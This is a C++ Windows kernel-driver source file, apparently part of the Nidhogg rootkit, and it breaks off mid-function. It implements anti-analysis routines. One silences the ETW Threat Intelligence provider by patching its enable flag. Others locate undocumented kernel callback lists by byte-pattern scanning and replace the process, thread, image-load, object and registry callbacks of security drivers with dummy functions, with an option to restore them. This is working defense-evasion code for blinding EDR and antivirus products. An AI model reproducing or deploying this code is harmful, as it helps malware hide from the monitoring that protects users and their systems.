#include "pch.h"
#include "AntiAnalysisHandler.h"

_IRQL_requires_max_(APC_LEVEL)
AntiAnalysisHandler::AntiAnalysisHandler() {
	prevEtwTiValue = 0;

	if (!InitializeList(&psRoutines))
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	if (!InitializeList(&obCallbacks)) {
		FreeVirtualMemory(psRoutines.Items);
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
	}

	if (!InitializeList(&cmCallbacks)) {
		FreeVirtualMemory(obCallbacks.Items);
		FreeVirtualMemory(psRoutines.Items);
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
	}
}

_IRQL_requires_max_(APC_LEVEL)
AntiAnalysisHandler::~AntiAnalysisHandler() {
	IrqlGuard guard;
	guard.SetExitIrql(PASSIVE_LEVEL);
	auto callbackCleaner = [](_In_ DisabledKernelCallback* item) -> void {
		NidhoggAntiAnalysisHandler->RestoreCallback(item);
	};
	ClearList<CallbackList, DisabledKernelCallback>(&psRoutines, callbackCleaner);
	FreeVirtualMemory(psRoutines.Items);
	ClearList<CallbackList, DisabledKernelCallback>(&obCallbacks, callbackCleaner);
	FreeVirtualMemory(obCallbacks.Items);
	ClearList<CallbackList, DisabledKernelCallback>(&cmCallbacks, callbackCleaner);
	FreeVirtualMemory(cmCallbacks.Items);
}

/*
* Description:
* EnableDisableEtwTI is responsible to enable or disable ETWTI.
*
* Parameters:
* @enable	[_In_ bool] -- Whether to enable or disable ETWTI.
*
* Returns:
* @status	[NTSTATUS]  -- Whether successfuly enabled or disabled.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS AntiAnalysisHandler::EnableDisableEtwTI(_In_ bool enable) {
	NTSTATUS status = STATUS_SUCCESS;
	EX_PUSH_LOCK etwThreatIntLock = NULL;
	ULONG foundIndex = 0;
	SIZE_T bytesWritten = 0;

	// Getting the location of KeInsertQueueApc dynamically to get the real location.
	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"KeInsertQueueApc");
	PVOID searchedRoutineAddress = MmGetSystemRoutineAddress(&routineName);

	if (!searchedRoutineAddress)
		return STATUS_NOT_FOUND;

	SIZE_T targetFunctionDistance = EtwThreatIntProvRegHandleDistance;
	PLONG searchedRoutineOffset = static_cast<PLONG>(FindPatterns(EtwThreatIntProvRegHandlePatterns,
		EtwThreatIntProvRegHandlePatternsCount, searchedRoutineAddress, targetFunctionDistance,
		&foundIndex));

	if (!searchedRoutineOffset)
		return STATUS_NOT_FOUND;
	PUCHAR etwThreatIntProvRegHandle = static_cast<PUCHAR>(searchedRoutineAddress) + (*searchedRoutineOffset) + foundIndex +
		EtwThreatIntProvRegHandleOffset;
	ULONG enableProviderInfoOffset = GetEtwProviderEnableInfoOffset();

	if (enableProviderInfoOffset == 0)
		return STATUS_UNSUCCESSFUL;

	PTRACE_ENABLE_INFO enableProviderInfo = reinterpret_cast<PTRACE_ENABLE_INFO>(etwThreatIntProvRegHandle +
		EtwGuidEntryOffset + enableProviderInfoOffset);
	ULONG lockOffset = GetEtwGuidLockOffset();

	if (lockOffset != 0) {
		etwThreatIntLock = reinterpret_cast<EX_PUSH_LOCK>(etwThreatIntProvRegHandle + EtwGuidEntryOffset + lockOffset);
		ExAcquirePushLockExclusiveEx(&etwThreatIntLock, 0);
	}

	if (enable) {
		status = MmCopyVirtualMemory(PsGetCurrentProcess(), &prevEtwTiValue, PsGetCurrentProcess(),
			&enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode, &bytesWritten);

		if (NT_SUCCESS(status))
			prevEtwTiValue = 0;
	}
	else {
		ULONG disableEtw = 0;
		status = MmCopyVirtualMemory(PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, PsGetCurrentProcess(),
			&prevEtwTiValue, sizeof(ULONG), KernelMode, &bytesWritten);

		if (NT_SUCCESS(status))
			status = MmCopyVirtualMemory(PsGetCurrentProcess(), &disableEtw, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled,
				sizeof(ULONG), KernelMode, &bytesWritten);
	}

	if (etwThreatIntLock)
		ExReleasePushLockExclusiveEx(&etwThreatIntLock, 0);

	return status;
}

/*
* Description:
* RestoreObCallback is responsible to restoring a certain callback from the callback list.
*
* Parameters:
* @callback [_In_ IoctlKernelCallback&] -- Callback to remove.
*
* Returns:
* @status   [NTSTATUS]					-- Whether successfuly restored or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS AntiAnalysisHandler::RestoreCallback(_In_ IoctlKernelCallback& callback) {
	DisabledKernelCallback* callbackEntry = nullptr;

	__try {
		callbackEntry = FindCallback(callback);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return GetExceptionCode();
	}

	if (!callbackEntry)
		return STATUS_NOT_FOUND;
	return RestoreCallback(callbackEntry);
}

/*
* Description:
* RestoreObCallback is responsible to restoring a certain callback from the callback list.
*
* Parameters:
* @callback [_Inout_ DisabledKernelCallback*] -- Callback to remove.
*
* Returns:
* @status   [NTSTATUS]						  -- Whether successfuly restored or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS AntiAnalysisHandler::RestoreCallback(_Inout_ DisabledKernelCallback* callback) {
	NTSTATUS status = STATUS_NOT_FOUND;

	if (callback->Type == ObProcessType || callback->Type == ObThreadType) {
		PFULL_OBJECT_TYPE objectType = NULL;

		switch (callback->Type) {
		case ObProcessType:
			objectType = reinterpret_cast<PFULL_OBJECT_TYPE>(*PsProcessType);
			break;
		case ObThreadType:
			objectType = reinterpret_cast<PFULL_OBJECT_TYPE>(*PsThreadType);
			break;
		}

		ExAcquirePushLockExclusive(reinterpret_cast<PULONG_PTR>(&objectType->TypeLock));
		POB_CALLBACK_ENTRY currentObjectCallback = reinterpret_cast<POB_CALLBACK_ENTRY>(&objectType->CallbackList);

		do {
			if (currentObjectCallback->Enabled &&
				reinterpret_cast<ULONG64>(currentObjectCallback->Entry) == callback->CallbackEntry) {
				if (currentObjectCallback->PreOperation == ObPreOpenDummyFunction) {
					currentObjectCallback->PreOperation = reinterpret_cast<POB_PRE_OPERATION_CALLBACK>(callback->CallbackAddress);
					status = STATUS_SUCCESS;
					break;
				}
				else if (currentObjectCallback->PostOperation == ObPostOpenDummyFunction) {
					currentObjectCallback->PostOperation = reinterpret_cast<POB_POST_OPERATION_CALLBACK>(callback->CallbackAddress);
					status = STATUS_SUCCESS;
					break;
				}
			}
			currentObjectCallback = reinterpret_cast<POB_CALLBACK_ENTRY>(currentObjectCallback->CallbackList.Flink);
		} while (static_cast<PVOID>(currentObjectCallback) != static_cast<PVOID>(&objectType->CallbackList));

		ExReleasePushLockExclusive(reinterpret_cast<PULONG_PTR>(&objectType->TypeLock));
	}
	else if (callback->Type >= PsCreateProcessTypeEx && callback->Type <= PsImageLoadType) {
		IoctlCallbackList<PsRoutine> routines{};
		ULONG64 replacedFunction = 0;
		routines.Type = callback->Type;

		switch (callback->Type) {
		case PsCreateProcessType:
			replacedFunction = reinterpret_cast<ULONG64>(CreateProcessNotifyDummyFunction);
			break;
		case PsCreateProcessTypeEx:
			replacedFunction = reinterpret_cast<ULONG64>(CreateProcessNotifyExDummyFunction);
			break;
		case PsCreateThreadType:
		case PsCreateThreadTypeNonSystemThread:
			replacedFunction = reinterpret_cast<ULONG64>(CreateThreadNotifyDummyFunction);
			break;
		case PsImageLoadType:
			replacedFunction = reinterpret_cast<ULONG64>(LoadImageNotifyDummyFunction);
			break;
		}
		status = ListAndReplacePsNotifyRoutines(nullptr, replacedFunction, callback->CallbackAddress);
	}
	else if (callback->Type == CmRegistryType) {
		IoctlCallbackList<CmCallback> callbacks{};
		ULONG64 replacedFunction = reinterpret_cast<ULONG64>(RegistryCallbackDummyFunction);
		status = ListAndReplaceRegistryCallbacks(nullptr, replacedFunction, callback->CallbackAddress);
	}

	if (NT_SUCCESS(status))
		status = RemoveCallback(callback) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
	return status;
}

/*
* Description:
* ReplaceCallback is responsible to replace a certain callback from the callback list.
*
* Parameters:
* @callback [_In_ IoctlKernelCallback&] -- Callback to remove.
*
* Returns:
* @status	[NTSTATUS]					-- Whether successfuly removed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS AntiAnalysisHandler::ReplaceCallback(_In_ IoctlKernelCallback& callback) {
	DisabledKernelCallback callbackEntry = { 0 };
	NTSTATUS status = STATUS_NOT_FOUND;

	if (callback.Type == ObProcessType || callback.Type == ObThreadType) {
		PFULL_OBJECT_TYPE objectType = NULL;
		ULONG64 operationAddress = 0;

		switch (callback.Type) {
		case ObProcessType:
			objectType = reinterpret_cast<PFULL_OBJECT_TYPE>(*PsProcessType);
			break;
		case ObThreadType:
			objectType = reinterpret_cast<PFULL_OBJECT_TYPE>(*PsThreadType);
			break;
		}

		ExAcquirePushLockExclusive(reinterpret_cast<PULONG_PTR>(&objectType->TypeLock));
		POB_CALLBACK_ENTRY currentObjectCallback = reinterpret_cast<POB_CALLBACK_ENTRY>(&objectType->CallbackList);

		do {
			if (currentObjectCallback->Enabled) {
				if (reinterpret_cast<ULONG64>(currentObjectCallback->PreOperation) == callback.CallbackAddress) {
					operationAddress = reinterpret_cast<ULONG64>(currentObjectCallback->PreOperation);
					currentObjectCallback->PreOperation = ObPreOpenDummyFunction;
				}
				else if (reinterpret_cast<ULONG64>(currentObjectCallback->PostOperation) == callback.CallbackAddress) {
					operationAddress = reinterpret_cast<ULONG64>(currentObjectCallback->PostOperation);
					currentObjectCallback->PostOperation = ObPostOpenDummyFunction;
				}

				if (operationAddress) {
					callbackEntry.CallbackAddress = callback.CallbackAddress;
					callbackEntry.CallbackEntry = reinterpret_cast<ULONG64>(currentObjectCallback->Entry);
					callbackEntry.Type = callback.Type;
					status = STATUS_SUCCESS;
					break;
				}
			}
			currentObjectCallback = reinterpret_cast<POB_CALLBACK_ENTRY>(currentObjectCallback->CallbackList.Flink);
		} while (static_cast<PVOID>(currentObjectCallback) != static_cast<PVOID>(&objectType->CallbackList));

		ExReleasePushLockExclusive(reinterpret_cast<PULONG_PTR>(&objectType->TypeLock));
	}
	else if (callback.Type >= PsCreateProcessTypeEx && callback.Type <= PsImageLoadType) {
		IoctlCallbackList<PsRoutine> routines{};
		ULONG64 replacerFunction = 0;

		switch (callback.Type) {
		case PsCreateProcessType:
			replacerFunction = reinterpret_cast<ULONG64>(CreateProcessNotifyDummyFunction);
			break;
		case PsCreateProcessTypeEx:
			replacerFunction = reinterpret_cast<ULONG64>(CreateProcessNotifyExDummyFunction);
			break;
		case PsCreateThreadType:
		case PsCreateThreadTypeNonSystemThread:
			replacerFunction = reinterpret_cast<ULONG64>(CreateThreadNotifyDummyFunction);
			break;
		case PsImageLoadType:
			replacerFunction = reinterpret_cast<ULONG64>(LoadImageNotifyDummyFunction);
			break;
		}

		status = ListAndReplacePsNotifyRoutines(nullptr, replacerFunction, callback.CallbackAddress);
		callbackEntry.CallbackAddress = callback.CallbackAddress;
		callbackEntry.Type = callback.Type;
	}
	else if (callback.Type == CmRegistryType) {
		IoctlCallbackList<CmCallback> callbacks{};
		ULONG64 replacerFunction = reinterpret_cast<ULONG64>(RegistryCallbackDummyFunction);

		status = ListAndReplaceRegistryCallbacks(nullptr, replacerFunction, callback.CallbackAddress);
		callbackEntry.CallbackAddress = callback.CallbackAddress;
		callbackEntry.Type = callback.Type;
	}

	if (NT_SUCCESS(status))
		status = AddCallback(callbackEntry) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
	return status;
}

/*
* Description:
* ListRegistryCallbacks is responsible to list all registered registry callbacks.
* 
* Parameters:
* @callbacks		[_Inout_ IoctlCallbackList<CmCallback>*] -- All callbacks as list.
* 
* Returns:
* @NTSTATUS													 -- Whether successfuly listed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS AntiAnalysisHandler::ListRegistryCallbacks(_Inout_ IoctlCallbackList<CmCallback>* callbacks) {
	return ListAndReplaceRegistryCallbacks(callbacks);
}

/*
* Description:
* ListAndReplaceRegistryCallbacks is responsible to list all registered registry callbacks and replace if needed.
*
* Parameters:
* @callbacks		[_Inout_opt_ IoctlCallbackList<CmCallback>*] -- All callbacks as list.
* @replacerFunction [_In_opt_ ULONG64]							 -- Function to replace with.
* @replacedFunction [_In_opt_ ULONG64]							 -- Function to be replaced.
*
* Returns:
* @status	 [NTSTATUS]											 -- Whether successfuly listed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS AntiAnalysisHandler::ListAndReplaceRegistryCallbacks(_Inout_opt_ IoctlCallbackList<CmCallback>* callbacks,
	_In_opt_ ULONG64 replacerFunction, 
	_In_opt_ ULONG64 replacedFunction) {
	MemoryGuard guard;
	NTSTATUS status = STATUS_SUCCESS;
	PCM_CALLBACK currentCallback = NULL;
	ULONG foundIndex = 0;
	char* driverName = nullptr;
	ULONG callbacksIndex = 0;
	errno_t err = 0;

	if (!callbacks && (replacerFunction == 0 || replacedFunction == 0))
		return STATUS_INVALID_PARAMETER;

	if (!cmCallbacks.sigCallbackList) {
		// Find CmpRegisterCallbackInternal.
		PUCHAR searchedRoutineAddress = reinterpret_cast<PUCHAR>(CmRegisterCallback);
		SIZE_T targetFunctionDistance = CmpRegisterCallbackInternalSignatureDistance;

		PLONG searchedRoutineOffset = static_cast<PLONG>(FindPattern(CallFunctionPattern, searchedRoutineAddress,
			targetFunctionDistance, &foundIndex));

		if (!searchedRoutineOffset)
			return STATUS_NOT_FOUND;

		// Find the function that holds the valuable information: CmpInsertCallbackInListByAltitude.
		searchedRoutineAddress = searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex +
			CallFunctionOffset;
		targetFunctionDistance = CmpInsertCallbackInListByAltitudeSignatureDistance;

		searchedRoutineOffset = static_cast<PLONG>(FindPattern(CmpInsertCallbackInListByAltitudePattern, searchedRoutineAddress,
			targetFunctionDistance, &foundIndex));

		if (!searchedRoutineOffset)
			return STATUS_NOT_FOUND;

		searchedRoutineAddress = searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex +
			CmpInsertCallbackInListByAltitudeOffset;

		// Get CallbackListHead and CmpCallBackCount.
		targetFunctionDistance = CallbackListHeadSignatureDistance;
		searchedRoutineOffset = static_cast<PLONG>(FindPattern(CallbackListHeadPattern, searchedRoutineAddress,
			targetFunctionDistance, &foundIndex));

		if (!searchedRoutineOffset)
			return STATUS_NOT_FOUND;

		PUCHAR callbacksList = searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + RoutinesListOffset;

		searchedRoutineOffset = static_cast<PLONG>(FindPatterns(RoutinesListCountPatterns,
			RoutinesListCountPatternsCount,
			searchedRoutineAddress,
			targetFunctionDistance, 
			&foundIndex));

		if (!searchedRoutineOffset)
			return STATUS_NOT_FOUND;

		PULONG callbacksListCount = reinterpret_cast<PULONG>(searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex +
			CallbacksListCountOffset);

		// Get CmpCallbackListLock.
		searchedRoutineOffset = static_cast<PLONG>(FindPattern(CmpCallbackListLockPattern, searchedRoutineAddress,
			targetFunctionDistance, &foundIndex));

		if (!searchedRoutineOffset)
			return STATUS_NOT_FOUND;

		ULONG_PTR callbackListLock = reinterpret_cast<ULONG_PTR>(searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex +
			CmpCallbackListLockOffset);
		cmCallbacks.sigCallbackList = callbacksList;
		cmCallbacks.sigCallbackListLock = callbackListLock;
		cmCallbacks.sigCallbackListCount = callbacksListCount;
	}
	ExAcquirePushLockExclusiveEx(&cmCallbacks.sigCallbackListLock, 0);

	if (callbacks && callbacks->Count != *cmCallbacks.sigCallbackListCount) {
		callbacks->Count = *cmCallbacks.sigCallbackListCount;
		ExReleasePushLockExclusiveEx(&cmCallbacks.sigCallbackListLock, 0);
		return status;
	}
	if (callbacks && callbacks->Callbacks) {
		status = ProbeAddress(callbacks->Callbacks, *cmCallbacks.sigCallbackListCount * sizeof(CmCallback),
			*cmCallbacks.sigCallbackListCount * sizeof(CmCallback));

		if (!NT_SUCCESS(status)) {
			callbacks->Count = *cmCallbacks.sigCallbackListCount;
			ExReleasePushLockExclusiveEx(&cmCallbacks.sigCallbackListLock, 0);
			return status;
		}
		if (!guard.GuardMemory(callbacks->Callbacks, 
			*cmCallbacks.sigCallbackListCount * sizeof(CmCallback), UserMode)) {
			ExReleasePushLockExclusiveEx(&cmCallbacks.sigCallbackListLock, 0);
			return STATUS_INSUFFICIENT_RESOURCES;
		}
	}
	currentCallback = reinterpret_cast<PCM_CALLBACK>(cmCallbacks.sigCallbackList);

	do {
		if (currentCallback->Function == 0) {
			currentCallback = reinterpret_cast<PCM_CALLBACK>(currentCallback->List.Flink);
			continue;
		}

		if (replacedFunction == currentCallback->Function) {
			currentCallback->Function = replacerFunction;
			break;
		}

		if (callbacks) {
			if (callbacks->Callbacks) {
				callbacks->Callbacks[callbacksIndex].CallbackAddress = currentCallback->Function;
				callbacks->Callbacks[callbacksIndex].Context = currentCallback->Context;

				__try {
					driverName = MatchCallback(reinterpret_cast<PVOID>(callbacks->Callbacks[callbacksIndex].CallbackAddress));

					if (driverName) {
						err = strcpy_s(callbacks->Callbacks[callbacksIndex].DriverName, driverName);
						FreeVirtualMemory(driverName);

						if (err != 0) {
							status = STATUS_ABANDONED;
							break;
						}
					}
				}
				__except (EXCEPTION_EXECUTE_HANDLER) {
					status = GetExceptionCode();
					break;
				}
			}
			callbacksIndex++;
		}
		
		currentCallback = reinterpret_cast<PCM_CALLBACK>(currentCallback->List.Flink);
	} while (static_cast<PVOID>(currentCallback) != cmCallbacks.sigCallbackList);

	ExReleasePushLockExclusiveEx(&cmCallbacks.sigCallbackListLock, 0);
	return status;
}

/*
* Description:
* ListPsNotifyRoutines is responsible to list all registered PsNotify routines.
* 
* Parameters:
* @callbacks		[_Inout_ IoctlCallbackList<PsRoutine>*] -- All callbacks as list.
* 
* Returns:
* @NTSTATUS													-- Whether successfuly listed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS AntiAnalysisHandler::ListPsNotifyRoutines(_Inout_ IoctlCallbackList<PsRoutine>* callbacks) {
	return ListAndReplacePsNotifyRoutines(callbacks);
}

/*
* Description:
* ListPsNotifyRoutines is responsible to list all registered PsNotify routines.
*
* Parameters:
* @callbacks		[_Inout_opt_ IoctlCallbackList<PsRoutine>*] -- All callbacks as list.
* @replacerFunction [_In_opt_ ULONG64]							-- Function to replace with.
* @replacedFunction [_In_opt_ ULONG64]							-- Function to be replaced.
*
* Returns:
* @status			[NTSTATUS]									-- Whether successfuly listed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS AntiAnalysisHandler::ListAndReplacePsNotifyRoutines(_Inout_opt_ IoctlCallbackList<PsRoutine>* callbacks,
	_In_opt_ ULONG64 replacerFunction, 
	_In_opt_ ULONG64 replacedFunction) {
	MemoryGuard guard;
	NTSTATUS status = STATUS_SUCCESS;
	PVOID searchedRoutineAddress = NULL;
	ULONG foundIndex = 0;
	SIZE_T targetFunctionDistance = 0;
	SIZE_T listDistance = 0;
	ULONG64 currentRoutineAddress = 0;
	PPS_ROUTINE currentRoutine = nullptr;
	errno_t err = 0;
	char* driverName = nullptr;
	Pattern listSignature = { 0 };
	listSignature.Versions = { WIN_1507, WIN_11_24H2 };
	listSignature.Reversed = false;
	listSignature.Wildcard = 0xCC;

	if (!callbacks && (replacerFunction == 0 || replacedFunction == 0))
		return STATUS_INVALID_PARAMETER;

	switch (callbacks->Type) {
	case PsCreateProcessTypeEx:
	case PsCreateProcessType: {
		searchedRoutineAddress = static_cast<PVOID>(PsSetCreateProcessNotifyRoutineEx);
		targetFunctionDistance = PspSetCreateProcessNotifyRoutineSignatureDistance;
		listSignature.RelativeOffset = sizeof(PspCreateProcessNotifyRoutineSignature);
		listSignature.Length = sizeof(PspCreateProcessNotifyRoutineSignature);
		listSignature.Data = const_cast<UCHAR*>(PspCreateProcessNotifyRoutineSignature);
		listDistance = PspCreateProcessNotifyRoutineDistance;
		break;
	}
	case PsCreateThreadType:
	case PsCreateThreadTypeNonSystemThread:
	{
		searchedRoutineAddress = static_cast<PVOID>(PsSetCreateThreadNotifyRoutine);
		targetFunctionDistance = PspSetCreateThreadNotifyRoutineSignatureDistance;
		listSignature.RelativeOffset = sizeof(PspCreateThreadNotifyRoutineSignature);
		listSignature.Length = sizeof(PspCreateThreadNotifyRoutineSignature);
		listSignature.Data = const_cast<UCHAR*>(PspCreateThreadNotifyRoutineSignature);
		listDistance = PspCreateThreadNotifyRoutineDistance;
		break;
	}
	case PsImageLoadType:
	{
		searchedRoutineAddress = static_cast<PVOID>(PsSetLoadImageNotifyRoutine);
		targetFunctionDistance = PsSetLoadImageNotifyRoutineExDistance;
		listSignature.RelativeOffset = sizeof(PspLoadImageNotifyRoutineSignature);
		listSignature.Length = sizeof(PspLoadImageNotifyRoutineSignature);
		listSignature.Data = const_cast<UCHAR*>(PspLoadImageNotifyRoutineSignature);
		listDistance = PspLoadImageNotifyRoutineDistance;
		break;
	}
	default:
		status = STATUS_INVALID_PARAMETER;
		break;
	}

	if (!NT_SUCCESS(status))
		return status;
	SIZE_T countOffset = RoutinesListOffset;

	PLONG searchedRoutineOffset = static_cast<PLONG>(FindPattern(CallFunctionPattern, 
		searchedRoutineAddress,
		targetFunctionDistance, 
		&foundIndex));

	if (!searchedRoutineOffset)
		return STATUS_NOT_FOUND;

	searchedRoutineAddress = static_cast<PUCHAR>(searchedRoutineAddress) + 
		*(searchedRoutineOffset) + 
		foundIndex + 
		CallFunctionOffset;

	PLONG routinesListOffset = static_cast<PLONG>(FindPattern(listSignature, 
		searchedRoutineAddress,
		listDistance, 
		&foundIndex));

	if (!routinesListOffset)
		return STATUS_NOT_FOUND;

	PULONG64 routinesList = reinterpret_cast<PULONG64>(static_cast<PUCHAR>(searchedRoutineAddress) +
		*(routinesListOffset) + 
		foundIndex + 
		RoutinesListOffset);

	PLONG routinesLengthOffset = static_cast<PLONG>(FindPatterns(RoutinesListCountPatterns,
		RoutinesListCountPatternsCount,
		searchedRoutineAddress,
		listDistance, 
		&foundIndex));

	if (!routinesLengthOffset)
		return STATUS_NOT_FOUND;

	if (callbacks->Type == PsCreateProcessType) {
		for (Pattern pattern : RoutinesListCountPatterns) {
			countOffset = pattern.GetOffsetForVersion(WindowsBuildNumber);

			if (countOffset != 0)
				break;
		}
	}
	else if (callbacks->Type == PsCreateThreadTypeNonSystemThread)
		countOffset = PsNotifyRoutinesRoutineCountOffset;

	ULONG routinesCount = *reinterpret_cast<PULONG>(static_cast<PUCHAR>(searchedRoutineAddress) + 
		*(routinesLengthOffset) +
		foundIndex + 
		countOffset);

	if (routinesCount > MAX_ROUTINES) {
		status = STATUS_UNSUCCESSFUL;
		return status;
	}

	if (callbacks && callbacks->Count != routinesCount) {
		callbacks->Count = routinesCount;
		return status;
	}
	if (callbacks && callbacks->Callbacks) {
		status = ProbeAddress(callbacks->Callbacks, 
			routinesCount * sizeof(PsRoutine),
			__alignof(PsRoutine*));

		if (!NT_SUCCESS(status)) {
			callbacks->Count = routinesCount;
			return status;
		}
		if (!guard.GuardMemory(callbacks->Callbacks,
			routinesCount * sizeof(PsRoutine), 
			UserMode)) {
			return STATUS_INSUFFICIENT_RESOURCES;
		}
	}

	for (ULONG i = 0; i < routinesCount; i++) {
		currentRoutineAddress = routinesList[i];
		currentRoutineAddress &= ROUTINE_MASK;
		currentRoutine = reinterpret_cast<PPS_ROUTINE>(currentRoutineAddress);

		if (currentRoutine->RoutineAddress == replacedFunction) {
			currentRoutine->RoutineAddress = replacerFunction;
			break;
		}

		if (callbacks && callbacks->Callbacks) {
			callbacks->Callbacks[i].CallbackAddress = currentRoutine->RoutineAddress;

			__try {
				driverName = MatchCallback(reinterpret_cast<PVOID>(callbacks->Callbacks[i].CallbackAddress));
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				status = GetExceptionCode();
				break;
			}
			err = strcpy_s(callbacks->Callbacks[i].DriverName, driverName);
			FreeVirtualMemory(driverName);

			if (err != 0) {
				status = STATUS_ABANDONED;
				break;
			}
		}
	}

	callbacks->Count = routinesCount;
	return status;
}

/*
* Description:
* ListObCallbacks is responsible to list all registered ObCallbacks of certain type.
*
* Parameters:
* @callbacks [_Inout_ IoctlCallbackList<ObCallback>*] -- All callbacks as list.
*
* Returns:
* @status	 [NTSTATUS]								  -- Whether successfuly listed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS AntiAnalysisHandler::ListObCallbacks(_Inout_ IoctlCallbackList<ObCallback>* callbacks) {
	NTSTATUS status = STATUS_SUCCESS;
	PFULL_OBJECT_TYPE objectType = NULL;
	char* driverName = nullptr;
	errno_t err = 0;
	ULONG index = 0;

	auto CopyDriverName = [&](_In_ POB_CALLBACK_ENTRY currentObjectCallback, _In_ bool isPreCallback) {
		__try {
			if (isPreCallback)
				driverName = MatchCallback(currentObjectCallback->PreOperation);
			else
				driverName = MatchCallback(currentObjectCallback->PostOperation);
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			status = GetExceptionCode();
			return status;
		}
		err = strcpy_s(callbacks->Callbacks[index].DriverName, driverName);
		FreeVirtualMemory(driverName);

		if (err != 0)
			status = STATUS_ABANDONED;
		return status;
	};

	switch (callbacks->Type) {
	case ObProcessType:
		objectType = reinterpret_cast<PFULL_OBJECT_TYPE>(*PsProcessType);
		break;
	case ObThreadType:
		objectType = reinterpret_cast<PFULL_OBJECT_TYPE>(*PsThreadType);
		break;
	default:
		status = STATUS_INVALID_PARAMETER;
		break;
	}

	if (!NT_SUCCESS(status))
		return status;

	ExAcquirePushLockExclusive(reinterpret_cast<PULONG_PTR>(&objectType->TypeLock));
	POB_CALLBACK_ENTRY currentObjectCallback = reinterpret_cast<POB_CALLBACK_ENTRY>(&objectType->CallbackList);

	if (callbacks->Count == 0) {
		do {
			if (currentObjectCallback->Enabled) {
				if (currentObjectCallback->PostOperation || currentObjectCallback->PreOperation)
					callbacks->Count++;
			}
			currentObjectCallback = reinterpret_cast<POB_CALLBACK_ENTRY>(currentObjectCallback->CallbackList.Flink);
		} while (static_cast<PVOID>(currentObjectCallback) != static_cast<PVOID>(&objectType->CallbackList));
	}
	else {
		MemoryGuard guard(callbacks->Callbacks, static_cast<ULONG>(callbacks->Count * sizeof(ObCallback)), UserMode);

		if (!guard.IsValid()) {
			ExReleasePushLockExclusive(reinterpret_cast<PULONG_PTR>(&objectType->TypeLock));
			return STATUS_INSUFFICIENT_RESOURCES;
		}
		do {
			if (currentObjectCallback->Enabled) {
				if (currentObjectCallback->PostOperation) {
					status = CopyDriverName(currentObjectCallback, false);

					if (!NT_SUCCESS(status))
						break;
					callbacks->Callbacks[index].PostOperation = currentObjectCallback->PostOperation;
				}
				if (currentObjectCallback->PreOperation) {
					status = CopyDriverName(currentObjectCallback, true);

					if (!NT_SUCCESS(status))
						break;
					callbacks->Callbacks[index].PreOperation = currentObjectCallback->PreOperation;
				}
				index++;
			}
			currentObjectCallback = reinterpret_cast<POB_CALLBACK_ENTRY>(currentObjectCallback->CallbackList.Flink);
		} while (index != callbacks->Count &&
			static_cast<PVOID>(currentObjectCallback) != static_cast<PVOID>(&objectType->CallbackList));
	}

	ExReleasePushLockExclusive(reinterpret_cast<PULONG_PTR>(&objectType->TypeLock));
	return status;
}

/*
* Description:
* MatchCallback is responsible to match the callback to its driver.
*
* Parameters:
* @callack	  [PVOID]    -- Callback's address.
*
* Returns:
* @driverName [char*]	 -- Driver's name.
*/
_IRQL_requires_max_(APC_LEVEL)
char* AntiAnalysisHandler::MatchCallback(_In_ PVOID callack) {
	NTSTATUS status = STATUS_SUCCESS;
	PRTL_PROCESS_MODULES info = NULL;
	ULONG infoSize;
	char* driverName = nullptr;
	errno_t err = 0;

	status = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &infoSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		FreeVirtualMemory(info);
		info = AllocateMemory<PRTL_PROCESS_MODULES>(infoSize);

		if (!info) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		status = ZwQuerySystemInformation(SystemModuleInformation, info, infoSize, &infoSize);
	}

	if (!NT_SUCCESS(status) || !info) {
		FreeVirtualMemory(info);
		ExRaiseStatus(status);
	}
	PRTL_PROCESS_MODULE_INFORMATION modules = info->Modules;

	for (ULONG i = 0; i < info->NumberOfModules; i++) {
		if (callack >= modules[i].ImageBase &&
			callack < static_cast<PVOID>(static_cast<PUCHAR>(modules[i].ImageBase) + modules[i].ImageSize)) {
			if (modules[i].FullPathName) {
				SIZE_T fullPathNameSize = strlen(reinterpret_cast<const char*>(modules[i].FullPathName));

				if (fullPathNameSize <= MAX_DRIVER_PATH) {
					driverName = AllocateMemory<char*>(fullPathNameSize + 1);

					if (!driverName) {
						status = STATUS_UNSUCCESSFUL;
						break;
					}
					err = strcpy_s(driverName, fullPathNameSize + 1, reinterpret_cast<const char*>(modules[i].FullPathName));

					if (err != 0) {
						status = STATUS_UNSUCCESSFUL;
						FreeVirtualMemory(driverName);
					}
				}
			}
			else
				status = STATUS_UNSUCCESSFUL;
			break;
		}
	}
	FreeVirtualMemory(info);

	if (!NT_SUCCESS(status) || !driverName)
		ExRaiseStatus(status);
	return driverName;
}

/*
* Description:
* AddCallback is responsible for adding a disabled callback to the list of disabled callbacks.
*
* Parameters:
* @Callback	  [_In_ DisabledKernelCallback&] -- Callback to add.
*
* Returns:
* @bool										 -- True if succeeded else false.
*/
_IRQL_requires_max_(APC_LEVEL)
bool AntiAnalysisHandler::AddCallback(_In_ DisabledKernelCallback& callback) {
	if (callback.CallbackAddress == 0 || callback.Type > CmRegistryType)
		return false;
